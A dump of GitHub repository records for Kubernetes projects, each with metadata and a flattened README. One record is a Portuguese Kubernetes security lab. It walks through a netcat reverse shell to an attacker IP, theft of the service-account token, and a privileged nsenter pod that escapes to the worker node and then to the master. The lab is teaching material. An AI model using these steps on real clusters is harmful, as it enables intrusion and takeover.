178 240 Welcome to nginx body width 35em margin 0 auto font family Tahoma Verdana Arial sans serif Welcome to nginx If you see this page the nginx web server is successfully installed and working Further configuration is required For online documentation and support please refer to nginx org Commercial support is available at nginx com Thank you for using nginx Run kubectl get endpoints or kubectl get ep to get list of exposed endpoints bash root vagrant home vagrant kubedata kubectl get ep NAME ENDPOINTS AGE kubernetes 10 0 2 15 6443 2d5h nginx 10 244 0 10 80 10 244 0 8 80 10 244 0 9 80 2m Since I am running 3 different replicas we are seeing 3 different Pod IPs Loadbalancer Service Notice External IP in bash root vagrant home vagrant kubedata kubectl get services NAME TYPE CLUSTER IP EXTERNAL IP PORT S AGE kubernetes ClusterIP 10 96 0 1 443 TCP 2d5h nginx ClusterIP 10 104 178 240 80 TCP 49s Since we are running this in local setup we dont have any CCM Cloud Config manager which can provision external IP for us to connect to the service running inside the Pod In case of Azure or AWS Cloud providers the CCM provisions and links external IPs for us So lets do a hack here Update nginx service to LoadBalancer File files nginx service lb yml yaml apiVersion v1 kind Service metadata name nginx spec type LoadBalancer selector app nginx app ports protocol TCP port 80 targetPort 80 Notice diff spec type LoadBalancer Apply the config kubectl apply f nginx service lb yml bash root vagrant home vagrant kubedata kubectl get svc NAME TYPE CLUSTER IP EXTERNAL IP PORT S AGE kubernetes ClusterIP 10 96 0 1 443 TCP 2d5h nginx LoadBalancer 10 104 178 240 80 32643 TCP 17m Now the state is pending Run netstat nltp and notice the kube proxy diff tcp 0 0 0 0 0 0 32643 0 0 0 0 LISTEN 13095 kube proxy tcp 0 0 127 0 0 1 10248 0 0 0 0 LISTEN 7024 kubelet tcp 0 0 127 0 0 1 10249 0 0 0 0 LISTEN 13095 kube proxy See the magic bash root vagrant home vagrant kubedata curl 0 0 0 0 32643 Welcome to nginx body width 35em margin 0 auto font family Tahoma Verdana Arial sans serif Welcome to nginx If you see this page the nginx web server is successfully installed and working Further configuration is required For online documentation and support please refer to nginx org Commercial support is available at nginx com Thank you for using nginx The LoadBalancer exposed the service endpoints out of Kubernetes cluster IP interface and in our vagrant host we can access it now directly The next challenge to to expose this kube proxy interface to host machine And hack is done then we can access the service running in Pod replica set deployment from our host interface directly This is how the network now looks like The port 32643 is not exposed through kube proxy over host control plane node bash Kubernetes Cluster POD NGINX LB POD 0 0 0 0 32643 Kube Proxy 80 SERVICE NGINX 80 HOST POD NGINX Stateless workloads Deployments ,2020-09-24T06:41:51Z,2020-12-21T18:36:30Z,Dockerfile,User,8,146,9,20,master,r0hi7#spekulatius,2,2,2,0,0,0,4
geerlingguy,kubernetes-101,cloud-native#containers#docker#education#k8s#kubernetes#series#streaming#youtube,Kubernetes 101 CI https github com geerlingguy kubernetes 101 workflows CI badge svg branch master event push https github com geerlingguy kubernetes 101 actions query workflow 3ACI A YouTube live streaming series by Jeff Geerling This repository contains code examples from the series and the code that powers the Kubernetes 101 website https kube101 jeffgeerling com Episodes Click on an episode title to see the resources for that episode Episode 1 Hello Kubernetes episode 01 November 18 2020 Episode 2 Containers episode 02 November 25 2020 Episode 3 Deploying Apps episode 03 December 2 2020 Episode 4 Real world apps episode 04 December 9 2020 Episode 5 Scaling Drupal in K8s episode 05 December 16 2020 Episode 6 DNS TLS Cron Logging episode 06 January 6 2021 Episode 7 Hello Operator episode 07 January 13 2021 Episode 8 Kube Meet Pi episode 08 January 20 2021 Episode 9 TBD episode 09 January 27 2021 Episode 10 TBD episode 10 February 3 2021 Ansible for Kubernetes Check out Jeff Geerling s book Ansible for Kubernetes https www ansibleforkubernetes com Static Jekyll site This GitHub project includes a Jekyll static site configuration inside the site folder which is used by a GitHub Actions workflow to build the static site displayed at https kube101 jeffgeerling com https kube101 jeffgeerling com Building the site locally Make sure you have Ruby and Bundler installed then cd site bundle exec jekyll serve,2020-11-05T16:56:48Z,2020-12-29T02:23:11Z,HTML,User,22,113,20,62,master,geerlingguy#ndt#petrkutalek,3,0,4,2,7,0,6
estahn,k8s-image-swapper,golang#kubernetes#kubernetes-webhook#mutating-webhook,k8s image swapper Mirror images into your own registry and swap image references automatically k8s image swapper is a mutating webhook for Kubernetes downloading images into your own registry and pointing the images to that new location It is an alternative to a docker pull through proxy https docs docker com registry recipes mirror The feature set was primarily designed with Amazon ECR in mind but may work with other registries Benefits Using k8s image swapper will improve the overall availability reliability durability and resiliency of your Kubernetes cluster by keeping 3rd party images mirrored into your own registry k8s image swapper will transparently consolidate all images into a single registry without the need to adjust manifests therefore reducing the impact of external registry failures rate limiting network issues change or removal of images while reducing data traffic and therefore cost TLDR Protect against external registry failure quay io outage https www reddit com r devops comments f9kiej quayioisexperiencinganoutage image pull rate limiting docker io rate limits https www docker com blog scaling docker to serve millions more developers network egress accidental image changes removal of images Use in air gaped environments without the need to change manifests Reduce NAT ingress traffic cost Documentation The documentation is available at https estahn github io k8s image swapper https estahn github io k8s image swapper index html Badges Release https img shields io github release estahn k8s image swapper svg style for the badge https github com estahn k8s image swapper releases latest Software License https img shields io badge license MIT brightgreen svg style for the badge LICENSE md Build status https img shields io github workflow status estahn k8s image swapper Test style for the badge https github com estahn k8s image swapper actions workflow build Codecov branch https img shields io codecov c github estahn k8s image swapper main svg style for the badge https codecov io gh estahn k8s image swapper Go Doc https img shields io badge godoc reference blue svg style for the badge http godoc org github com estahn k8s image swapper Conventional Commits https img shields io badge Conventional 20Commits 1 0 0 yellow svg style for the badge https conventionalcommits org Contributor Covenant https img shields io badge Contributor 20Covenant v2 0 20adopted ff69b4 svg style for the badge codeofconduct md Stargazers over time Stargazers over time https starchart cc estahn k8s image swapper svg https starchart cc estahn k8s image swapper,2020-12-10T11:19:54Z,2020-12-29T11:10:45Z,Go,User,3,111,4,98,main,estahn#renovate[bot]#semantic-release-bot#renovate-bot#jurgenweber,5,6,6,12,9,4,21
k8ssandra,k8ssandra,cassandra#helm#kubernetes#nosql,K8ssandra A distribution of Cassandra made for Kubernetes Overview K8ssandra provides a full open source stack for running and managing Cassandra in Kubernetes Cassandra K8ssandra packages and deploys Apache Cassandra https cassandra apache org Monitoring Monitoring includes the collection the storage and the visualization of metrics With that in mind K8ssandra integrates the following components Metric Collector for Apache Cassandra MCAC MCAC https github com datastax metric collector for apache cassandra collects and aggregate Cassandra and OS level metrics that can easily be stored in Prometheus Prometheus Prometheus https prometheus io is a very popular time series metrics database that is used extensively both inside of as well as outside of Kubernetes deployments Grafana Grafana https grafana com is the de facto standard for dashboards Repairs Reaper http cassandra reaper io is used to schedule and manage repairs in Cassandra Backup Restore Implementation K8ssandra is essentially an aggregation of several components that together comprise the stack described above cass operator https github com datastax cass operator prometheus operator https github com prometheus operator prometheus operator grafana operator https github com integr8ly grafana operator reaper operator https github com thelastpickle reaper operator helm https helm sh,2020-10-18T03:12:19Z,2020-12-23T15:07:43Z,YAML,Organization,12,100,21,294,main,jsanda#johnsmartco#bradfordcp#jeffbanks#burmanm#jakerobb#idleyoungman#parham-pythian#vmarchese,9,2,17,54,16,11,72
kinderyj,presto-on-k8s-operator,,Introduction This repo is used to create presto cluster in Kubernetes Basic Functions 1 Create Presto Coordinator Worker Service and Configmap automatically according to the user s CR 2 Support dynamic args dynamicArgs and dynamic configs dynamicConfigs Please Refer to the CR located in config samples prestooperatorv1alpha1prestocluster yaml Run and Deploy Run in local make install make run Deploy to the Kubernetes make install kubectl apply f setup operator yaml,2020-09-23T03:12:24Z,2020-12-26T16:24:27Z,Go,User,21,99,21,21,master,kinderyj,1,0,0,0,0,0,0
xiaods,k8e,kubernetes,K8e said kuber easy Simple Kubernetes Distribution Kubernetes Easy k8e is a lightweight Extensible Enterprise Kubernetes distribution that allows users to uniformly manage secure and get out of the box kubernetes cluster for enterprise environments The k8e said kuber easy project builds on upstream project K3s https github com rancher k3s as codebase remove Edge IoT features and extend enterprise features with best practices Go Report Card https goreportcard com badge github com xiaods k8e https goreportcard com report github com xiaods k8e Hex pm https img shields io hexpm l apa https github com xiaods k8e blob master LICENSE Great for CI Development Enterprise Deployment Quick Start Building Installing 1 Building k8e The clone will be much faster on this repo if you do bash git clone depth 1 https github com xiaods k8e git This repo includes all of Kubernetes history so depth 1 will avoid most of that The k8e build process requires some autogenerated code and remote artifacts that are not checked in to version control To prepare these resources for your build environment run bash make generate To build the full release binary you may now run make which will create dist artifacts k8e To build the binaries using without running linting ie if you have uncommitted changes bash SKIPVALIDATE true make 2 Run server bash sudo k8e check config sudo k8e server Kubeconfig is written to etc k8e k8e k8e yaml export KUBECONFIG etc k8e k8e k8e yaml sudo k8e kubectl get nodes On a different node run the below NODETOKEN comes from var lib k8e k8e server node token on your server sudo k8e agent server https myserver 6443 token NODETOKEN Architecture k8e arch docs k8e arch png Acknowledgments Thanks k3s https github com rancher k3s for the great open source project,2020-09-03T09:47:24Z,2020-12-29T02:53:20Z,Go,User,6,63,0,110,master,szuwgh#xiaods,2,1,1,0,2,0,33
P0ssuidao,k8s-pod-sec-lab,,Kubernetes seguro por default ou prova de m configura o Lab explica o Para montar nosso lab vamos precisar de um cluster kubernetes pode ser at no kind ou minikube N o executar esse lab em um cluster produtivo Primeiro vamos criar nosso namespace pod service account e roles kubectl create ns production kubectl create sa web app sa n production kubectl create role web app role n production verb get list create resource pods pods exec kubectl create rolebinding binding role app serviceaccount production web app sa role web app role n production kubectl run web app image p0ssuidao vulne pod lab 01 serviceaccount web app sa n production kubectl expose pod n production web app port 8080 target port 8080 type NodePort name web app role kubectl get no o wide kubectl get svc n production Agora basta acessar no seu navegador IP do node Node port User foo Pass bar Agora vamos abrir a porta 32000 para receber a conex o sudo nc l 32000 Executar no terminal remoto para ganhar acesso a shell nc e bin bash IP da sua maquina 32000 Primeiro identificarmos com qual usurio estamos logados id A aplica o est rodando com o usurio appuser ent o vamos ver quais processos est o em execu o ps aux Existe um nmero muito baixo de processos Ter poucos processos o primeiro indicativo que a aplica o em um container Por default um container roda com o usurio root mas isso pode ser alterado Levantaremos informaes sobre o release do S O uname a cat etc release Aqui h informaes como a linha da distribui o GNU Linux e vers o do Kernel Com isso j pode se iniciar a busca por exploits para a vers o de kernel e baseados na distro Continuando a busca listaremos as variveis de ambiente env Vamos continuar o reconhecimento para termos certeza que estamos rodando em um container Para isso vamos utilizar a ferramenta amicontained pois com ela conseguimos uma serie de informaes como Container Runtime Existncia de namespace Capabilities Syscalls liberadas cd tmp curl fSL https github com genuinetools amicontained releases download v0 4 9 amicontained linux amd64 o amicontained chmod a x amicontained amicontained Todo pod deploy e rs possui uma serviceaccount e por padr o s o executados com a conta default Uma serviceaccount fornece uma identidade para processos executados em um pod e nela s o atrelado as rules de permiss o As chaves e certificados ficam em um volume montado no pod cd var run secrets kubernetes io serviceaccount Primeiro vamos ver a vers o do cluster e se conseguimos interagir com a API curl k https KUBERNETESSERVICEHOST KUBERNETESSERVICEPORT version J que conseguimos acesso a API com esse token vamos tentar listar alguns pods de inicio vamos tentar listar no namespace em que estamos TOKEN cat var run secrets kubernetes io serviceaccount token NS cat var run secrets kubernetes io serviceaccount namespace curl k https KUBERNETESSERVICEHOST KUBERNETESSERVICEPORT api header Authorization Bearer TOKEN insecure curl k https KUBERNETESSERVICEHOST KUBERNETESSERVICEPORT api v1 namespaces NS pods header Authorization Bearer TOKEN insecure Conseguimos listar os pods e isso muito interessante Para facilitar um pouco as coisas vamos baixar o kubectl para interagir com o cluster cd tmp curl LO https storage googleapis com kubernetes release release v1 18 0 bin linux amd64 kubectl chmod x kubectl Listaremos os pods com o kubectl kubectl get pod Para testar nossos acessos vamos utilizar o kubectl auth can i kubectl auth can i list kubectl auth can i create pods Agora vamos tentar escalar nosso privilegio sem utilizar nenhum exploit apenas conhecimento da ferramenta cd tmp cat root shell yml EOF apiVersion v1 kind Pod metadata labels run root shell name root shell spec containers command nsenter mount proc 1 ns mnt bin bash image alpine imagePullPolicy IfNotPresent name root shell securityContext privileged true stdin true tty true dnsPolicy ClusterFirst hostPID true EOF kubectl apply f root shell yml sleep 10 kubectl get pods sleep 10 kubectl exec it root shell bash Conseguimos acesso uma mquina Verificando os acessos id ps aux docker ps cat etc hostname Nosso acesso a um worker mas queremos chegar nos master para isso ser necessrio informaes sobre os demais nodes Como vimos nossa conta n o possui permiss o para listar os nodes ent o vamos procurar um conta que consiga listar os nodes Lembrando dos componentes que fazem parte do node o kubelet possui permiss o para verificar os ns ativos vamos tentar utilizar sua configura o de autentica o para listarmos os nodes Vamos pegar suas config com systemctl status kubelet Com a config do kubelet tentaremos listar os nodes usando o parametro kubeconfig kubectl get no kubeconfig etc kubernetes kubelet conf Conseguimos Agora vamos forar o scheduler nos agendar no node master Mas primeiro precisamos voltar para nosso container com permiss o de cria o de pods exit Nome do node Master Substituir pelo nome do seu n em yml abaixo cd tmp cat master root shell yml EOF apiVersion v1 kind Pod metadata labels run master root shell name master root shell spec containers command nsenter mount proc 1 ns mnt bin bash image alpine imagePullPolicy IfNotPresent name master root shell securityContext privileged true stdin true tty true dnsPolicy ClusterFirst hostPID true nodeName Nome do node Master tolerations effect NoExecute operator Exists EOF kubectl apply f master root shell yml sleep 10 kubectl get pods sleep 10 kubectl exec it master root shell bash Conseguimos acesso ao master id ps aux docker ps kubectl get no kubectl auth can i list,2020-08-25T19:33:40Z,2020-10-15T22:30:40Z,n/a,User,3,44,12,9,master,P0ssuidao#tiago-de-almeida,2,0,0,0,0,0,1
StenlyTU,K8s-training-official,,K8s Practice Training The goal of this tutorial is to give good understanding of Kubernetes and help preparing you for CKA CKAD and CKS To achieve this you need running Kubernetes cluster During the tutorial every user is going to create personal namespace and execute all exercises there There are 50 tasks with increasing difficulty Tested with K8s version 1 19 2 and kubectl version 1 19 2 K8s learning materials 1 Docker is a must You can start with the book Docker in Action The book can be downloaded https www pdfdrive com docker in action e34422630 html from Internet 2 Check the free K8s courses in EDX https www edx org course introduction to kubernetes 3 The book Kubernetes in action gives good general overview The book can be downloaded https github com indrabasak Books blob master Kubernetes 20in 20Action pdf from Internet 4 For security related topics have a look at Container Security by Liz Rice The book can be downloaded https cdn2 hubspot net hubfs 1665891 Assets Container 20Security 20by 20Liz 20Rice 20 20OReilly 20Apr 202020 pdf from Internet 4 And ofc https kubernetes io docs home Hands on experience Download the kubeconfig file from your cluster and configure kubectl to use it export KUBECONFIG path to the kubeconfig yaml Core Concepts 1 Create namespace called practice All following commands will be run into this namespace if not specified show kubectl create ns practice Take away always try to use shortnames To find the shortname of resource run kubectl api resources grep namespaces 2 Create two pods with names nginx1 and nginx2 into your namespace All of them should have the label app v1 show kubectl run n practice nginx1 image nginx restart Never labels app v1 kubectl run n practice nginx2 image nginx restart Never labels app v1 Take away Try to learn most important kubectl run options which can save you a lot of time and manual work on yaml files 3 Change the labels of pod nginx2 to be app v2 show kubectl n practice label po nginx2 app v2 overwrite Take away use overwrite when changing labels 4 Get only pods with label app v2 from all namespaces show kubectl get pods all namespaces true l app v2 Take away l can be used to filter resources by labels Alternative kubectl get pods A l app v2 5 Remove the nginx pods to clean your namespace show kubectl n practice delete pod nginx1 2 6 Create a messaging pod using redis alpine image with label set to tier msg Check pod s labels show kubectl run n practice messaging image redis alpine l tier msg kubectl n practice describe pod messaging head Name messaging Namespace practice Priority 0 Node ip 10 250 13 141 eu central 1 compute internal 10 250 13 141 Start Time Sun 19 Apr 2020 16 25 19 0300 Labels tier msg Annotations cni projectcalico org podIP 100 96 1 4 32 cni projectcalico org podIPs 100 96 1 4 32 kubernetes io psp extensions gardener cloud provider aws csi driver node Status Running Take away Use l alongside kubectl run to create pods with specific label 7 Create a service called messaging service to expose the messaging application within the cluster on port 6379 and describe it show kubectl n practice expose pod messaging name messaging service port 6379 kubectl n practice describe svc messaging service Name messaging service Namespace practice Labels tier msg Annotations Selector tier msg Type ClusterIP IP 100 67 250 244 Port 6379 TCP TargetPort 6379 TCP Endpoints 100 96 0 20 6379 Session Affinity None Events Take away kubectl expose is easy way to create service automatically when applicable 8 Create a busybox echo pod that echoes hello world and exits After that check the logs show kubectl n practice run busybox echo image busybox command echo Hello world kubectl n practice logs busybox echo Take away with command we can execute commands from within the container 9 Create an nginx test pod and set an env value as var1 val1 Check the env value existence within the pod show kubectl n practice run nginx test image nginx env var1 val1 kubectl n practice exec it nginx test env should see var1 val1 in the output Deployments 10 Create a deployment named hr app using the image nginx 1 18 with 2 replicas show kubectl n practice create deployment hr app image nginx 1 18 dry run client o yaml deploy yaml vi deploy yaml YAML apiVersion apps v1 kind Deployment metadata creationTimestamp null labels app hr app name hr app namespace practice spec replicas 2 Change to 2 selector matchLabels app hr app strategy template metadata creationTimestamp null labels app hr app spec containers image nginx 1 18 name nginx resources status kubectl apply f deploy yaml Take away dry run client is used to check if the resource can be created Adding o yaml filename yaml redirects the raw output to file 11 Scale hr app deployment to 3 replicas show kubectl n practice scale deploy hr app replicas 3 Take away resourcetype resourcename syntax can also be used 12 Update the hr app image to nginx 1 19 show kubectl n practice set image deploy hr app nginx nginx 1 19 Take away You can also edit the deployment manually with kubectl n practice edit deploy hr app 13 Check the rollout history of hr app and confirm that the replicas are OK show kubectl n practice rollout history deploy hr app kubectl n practice get deploy hr app kubectl n practice get rs check that a new replica set has been created kubectl n practice get po l app hr app 14 Undo the latest rollout and verify that new pods have the old image nginx 1 18 show kubectl n practice rollout undo deploy hr app kubectl n practice get po select one of the Running pods kubectl n practice describe po hr app 695f79495 6gfsw grep i Image should be nginx 1 18 15 Do an update of the deployment with a wrong image nginx 1 91 and check the status show kubectl n practice set image deploy hr app nginx nginx 1 91 kubectl n practice rollout status deploy hr app kubectl n practice get po you ll see ErrImagePull 16 Return the deployment to working state and verify the image is nginx 1 19 show kubectl n practice rollout undo deploy hr app kubectl n practice describe deploy hr app grep Image kubectl n practice get pods l app hr app Scheduling 17 Shedule a nginx pod on specific node using NodeName show Assigning Pods to Nodes documentation https kubernetes io docs concepts configuration assign pod node nodename Generate yaml file kubectl n practice run nginx nodename image nginx dry run client o yaml nodename yaml Choose one of the nodes kubectl get nodes and edit the file YAML apiVersion v1 kind Pod metadata creationTimestamp null labels run nginx nodename name nginx nodename spec nodeName add containers image nginx name nginx nodename resources dnsPolicy ClusterFirst restartPolicy Always status Create the pod and check where the pod was scheduled Hint Use o wide to check on which node the pod landed 18 Schedule a nginx pod based on node label using nodeSelector show Assigning Pods to Nodes documentation https kubernetes io docs concepts configuration assign pod node nodeselector Pick one of the nodes and check for hostname label kubectl describe node grep hostname Generate yaml file and add nodeSelector field with above label as described into the documentation Check if the pod has landed at the correct node Take away use nodeSelector when you want to schedule pods only on nodes with specific labels 19 Taint a node with key spray value mortein and effect NoSchedule Check that new pods are not scheduled on it show Taint and Toleration documentation https kubernetes io docs concepts configuration taint and toleration kubectl taint nodes spray mortein NoSchedule Create nginx pod and check that it s not scheduled onto the tainted node Take away A taint allows a node to refuse pod to be scheduled unless that pod has a matching toleration 20 Create another pod called nginx toleration with nginx image which tolerates the above taint show Taint and Toleration documentation https kubernetes io docs concepts configuration taint and toleration Use the documentation to figure out the yaml and check that the pod has landed onto the tainted node Delete the pod and remove the taint from the node Use the following to remove the taint kubectl taint nodes spray mortein NoSchedule Take away Pods can be scheduled on taint nodes if they tolerate the taint 21 Create a DaemonSet using image fluentd elasticsearch 1 20 show DaemonSet documentation https kubernetes io docs concepts workloads controllers daemonset Use this yaml or try to make it alone from the documentation YAML apiVersion apps v1 kind DaemonSet metadata creationTimestamp null labels app elastic search name elastic search namespace practice spec selector matchLabels app elastic search template metadata creationTimestamp null labels app elastic search spec containers image k8s gcr io fluentd elasticsearch 1 20 name fluentd elasticsearch resources Take away A DaemonSet ensures that all or some Nodes run a copy of a Pod 22 Add label color blue to one node and create nginx deployment called blue with 5 replicas and node Affinity rule to place the pods onto the labeled node show Affinity and anti affinity documentation https kubernetes io docs concepts configuration assign pod node affinity and anti affinity kubectl label node color blue Generate your own yaml or use this one There is something wrong with it YAML apiVersion apps v1 kind Deployment metadata name blue spec replicas 5 selector matchLabels run nginx template metadata labels run nginx spec containers image nginx imagePullPolicy Always name nginx affinity requiredDuringSchedulingIgnoredDuringExecution nodeSelectorTerms matchExpressions key color operator In values blue Check that all pods are scheduled onto the labeled node Take away Node affinity is a set of rules used by the scheduler to determine where a pod can be placed Configurations 23 Create a configmap named my config with values key1 val1 and key2 val2 Check it s values show ConfigMap documentation https kubernetes io docs tasks configure pod container configure pod configmap kubectl n practice create configmap my config from literal key1 val1 from literal key2 val2 kubectl n practice get cm my config o yaml Take away ConfigMap gives you a way to inject configurational data into your application 24 Create a configMap called opt with value key5 val5 Create a new nginx opt pod that loads the value from key key5 in an env variable called OPTIONS show Configmap documentation https kubernetes io docs tasks configure pod container configure pod configmap Use the documentation to figure out the yaml file kubectl n practice exec it nginx opt env grep OPTIONS should return val5 Take away ConfigMap is namespaced resource 26 Create a configmap anotherone with values var6 val6 and var7 val7 Load this configmap as an env variables into a nginx sec pod show Configmap documentation https kubernetes io docs tasks configure pod container configure pod configmap kubectl n practice exec it nginx sec env grep var should return var6 val6nvar7 val7 26 Create a configMap cmvolume with values var8 val8 and var9 val9 Load this as a volume inside an nginx cm pod on path etc spartaa Create the pod and ls into the etc spartaa directory show Configmap documentation https kubernetes io docs tasks configure pod container configure pod configmap Hints create the CM and use dry run client to generate the yaml After that add the corresponding fieds to the yaml kubectl n practice exec it nginx cm ls etc spartaa should return var8 var9 27 Create an nginx pod with requests cpu 100m memory 256Mi and limits cpu 200m memory 512Mi show Assign Resources documentation https kubernetes io docs tasks configure pod container assign cpu resource Hint check kubectl run options 28 Create a secret called mysecret with values password mypass and check its yaml show Secrets documentation https kubernetes io docs concepts configuration secret kubectl n practice create secret generic mysecret from literal password mypass Take away Secrets are base64 encoded not encrypted bXlwYXNz 29 Create an nginx pod that mounts the secret mysecret in a volume on path etc foo show How to use Secrets https kubernetes io docs tasks inject data application distribute credentials secure Hint The approach is similar to configMaps Take away Secret is namespaced resource Observability 30 Get the list of nodes in JSON format and store it in a file show kubectl get nodes o json brahmaputra json Take away Check what other output formats are available 31 Get CPU memory utilization for nodes show kubectl top nodes Take away kubectl top pods all namespaces true can be used for pods 32 Create an nginx pod with a liveness probe that just runs the command ls Check probe status show Configure Liveness Probes https kubernetes io docs tasks configure pod container configure liveness readiness startup probes define a liveness command kubectl n practice run nginx live image nginx dry run client o yaml podliveness yaml vi podliveness yaml YAML apiVersion v1 kind Pod metadata creationTimestamp null labels run nginx live name nginx live spec containers image nginx name nginx live resources livenessProbe add exec add command add ls add dnsPolicy ClusterFirst restartPolicy Always status kubectl n practice apply f pod yaml kubectl n practice describe pod nginx live Take away The kubelet uses liveness probes to know when to restart a container 33 Create an nginx pod that includes port 80 with an HTTP readinessProbe on path on port 80 show Configure Liveness Readiness Probes https kubernetes io docs tasks configure pod container configure liveness readiness startup probes kubectl n practice run nginx ready image nginx dry run client o yaml port 80 podreadiness yaml Find what needs to be added to the file from the above documentation Take away K8s uses readiness probes to decide when the container is available for accepting traffic 34 Use JSON PATH query to retrieve the osImages of all the nodes show kubectl get nodes o jsonpath items status nodeInfo osImage You should see something like that Container Linux by CoreOS 2303 3 0 Rhyolite Take away Try to understand the construct of the query Storage 35 Create a PersistentVolume of 1Gi called myvolume practice Make it have accessMode of ReadWriteOnce and ReadWriteMany storageClassName normal mounted on hostPath etc foo List all PersistentVolume show PersistentVolume documentation https kubernetes io docs tasks configure pod container configure persistent volume storage create a persistentvolume Use the following output YAML kind PersistentVolume apiVersion v1 metadata name myvolume practice spec storageClassName normal capacity storage 1Gi accessModes ReadWriteOnce ReadWriteMany hostPath path etc foo kubectl get pv status should be Available Take away PersistentVolume is not namespaced resource 36 Create a PersistentVolumeClaim called mypvc practice requesting 400Mi with accessMode of ReadWriteOnce and storageClassName of normal Check the status of the PersistenVolume show Use PersistentVolumeClaim documentation https kubernetes io docs t,2020-10-23T12:08:54Z,2020-12-27T07:11:32Z,n/a,User,10,40,22,8,main,StenlyTU#runlevl4,2,0,0,0,2,0,2
geerlingguy,50k-k8s-jobs,ansible#jobs#k8s#kubernetes#video#youtube,50 000 Kubernetes Jobs for 50 000 Subscribers CI https github com geerlingguy 50k k8s jobs workflows CI badge svg https github com geerlingguy 50k k8s jobs actions query workflow 3ACI I just passed 50 000 subscribers on my YouTube channel https www youtube com c JeffGeerling so I thought I d find a fitting way to celebrate For 10 000 subscribers I ran 10 000 K8s Pods on an Amazon EKS cluster you can find a video detailing that here 10 000 Pods for 10k Subscribers https www youtube com watch v k5ncj3TKL1c So for 50 000 I was doing a few calculations and found that I d have to pay a few hundred bucks at least just for the time on an EKS cluster with enough workers to run 50 000 Pods simultaneously So that was right out Instead I m building this Ansible playbook to automate the process of running 50 000 individual Jobs on a Kubernetes cluster And of course I made a video detailing the process and thanking my subscribers 50 000 Kubernetes Jobs for 50k Subcribers https www youtube com watch v O1iEBzY7 ok Local Testing Make sure you have Ansible https docs ansible com ansible latest installationguide introinstallation html and Kind https kind sigs k8s io docs user quick start installed then run the following 1 kind create cluster 1 pip3 install ansible molecule docker yamllint ansible lint openshift 1 ansible galaxy install r requirements yml 1 molecule converge When you re finished run kind delete cluster Running on a Production Cluster I guess this is a great opportunity to thank this project s sponsor Linode they not only sponsored my 50 000 Kubernetes Jobs for 50 000 Subscribers video but they also did two other very kind things 1 They gave me some credit to try out this project on their Linode Kubernetes Engine 2 They gave me a special link I can share with you to get a 100 60 day free credit on your own new Linode account Seriously Go try out Linode using my link https www linode com geerling and you can take some new infrastructure for a spin for free Anyways since I knew I d build this cluster on Linode I went ahead and did the following 1 Created my Linode account use this link https www linode com geerling for free credit 2 Created a new Kubernetes Cluster 3 Added 10 8GB Linodes to the Cluster 4 Waited for the Cluster and all Nodes to boot 5 Downloaded the Kubeconfig file from Linode s Kubernetes UI 6 Told Ansible about the Kubeconfig with export K8SAUTHKUBECONFIG kube linode yaml 7 Ran molecule converge That runs with all the defaults in the playbook If you want to override them the easiest way is to run ansible playbook and pass extra variables ansible playbook main yml extra vars batchsize 500 totalcount 50000 Check on how many jobs have completed by monitoring kubectl get jobs l type 50k field selector status successful 1 Note For efficiency s sake each batch of jobs is deleted after it successfully runs otherwise there seems to be hard limit of how many Jobs Pods will remain present on the cluster and the scheduler grinds to a halt If you want to leave all jobs in place add the extra variable inflightcleanup true Disabling Inflight Cleanup of Jobs Because I encountered issues when running more than 3 000 5 000 Jobs in a given cluster I set up the playbook to run a batch of Jobs then delete all those Jobs and their orphaned Pods then move on to the next batch This allowed the playbook to deploy all 50 000 Jobs But you can bypass that inflight cleanup of each batch by setting inflightcleanup false in the playbook extra vars for example ansible playbook main yml extra vars batchsize 500 totalcount 50000 inflightcleanup false Note that this configuration has not yet been successfully used to deploy more than 4 000 5 000 Jobs on a single cluster but it does allow you to dump a LOT of Jobs into a cluster and see how far it can get Author This project was created by Jeff Geerling https www jeffgeerling com author of Ansible for DevOps https www ansiblefordevops com and Ansible for Kubernetes https www ansibleforkubernetes com in support of a video celebrating 50 000 subscribers on his YouTube channel https www youtube com c JeffGeerling,2020-10-07T18:08:44Z,2020-12-07T06:42:51Z,HTML,User,2,37,2,18,master,geerlingguy,1,0,5,1,3,0,0
nushkovg,k1s,ddns#grafana#hugo#k1s#k1s-platform#k3d#k3s#klipper#kubernetes#letsencrypt#namesilo#prometheus#raspberry-pi#skaffold#traefik-v2,k1s The k1s platform contains all services required to start a k3d cluster on a Raspberry PI with Skaffold It is meant for those who want to create their own home lab cluster with a lightweight Kubernetes release with a preloaded ingress controller and several monitoring tools Since k1s is in the early stage of development it currently allows only Namesilo https www namesilo com as the DNS provider Installation Please follow this documentation from start to finish if you want to set k1s up on your Raspberry PI It is still in the early development phase and unexpected bugs might occur if you skip some of the steps You can find the documentation on the official website https www k1s dev Features k1s comes preloaded with the following K3D Klipper ServiceLB Metrics Server Skaffold Traefik Prometheus Grafana Kubernetes Dashboard Hugo Dashboard UI GitHub Oauth2 Middleware Custom Error Pages Middleware Wildcard LetsEncrypt SSL Certificate DDNS Update CronJob for Namesilo A Records The most of the setup is done via a CLI interface named KubePI https github com nushkovg kubepi It is a custom tool for making the k1s management easier for the K3D setup dependencies submodules and more The usage of kubepi is explained in the documentation Contributing Please read CONTRIBUTING md https github com nushkovg k1s blob master CONTRIBUTING md for details on our code of conduct and the process for submitting pull requests to us Versioning We use SemVer http semver org for versioning For the versions available see the tags on this repository https github com nushkovg k1s tags Authors Goran Nushkov https github com nushkovg License This project is licensed under the Apache v2 License see the LICENSE md https github com nushkovg k1s blob master LICENSE file for details Acknowledgments vikaspogu dev https vikaspogu dev posts kubernetes home cluster traefik DNS Routing and CronJobs thomseddon https github com thomseddon traefik forward auth Oauth2 gesquive https github com gesquive slate Dashboard Theme tarampampam https github com tarampampam error pages Custom Traefik Error Pages,2020-09-23T15:43:41Z,2020-11-30T11:30:16Z,n/a,User,2,34,1,13,master,nushkovg,1,0,3,0,0,0,3
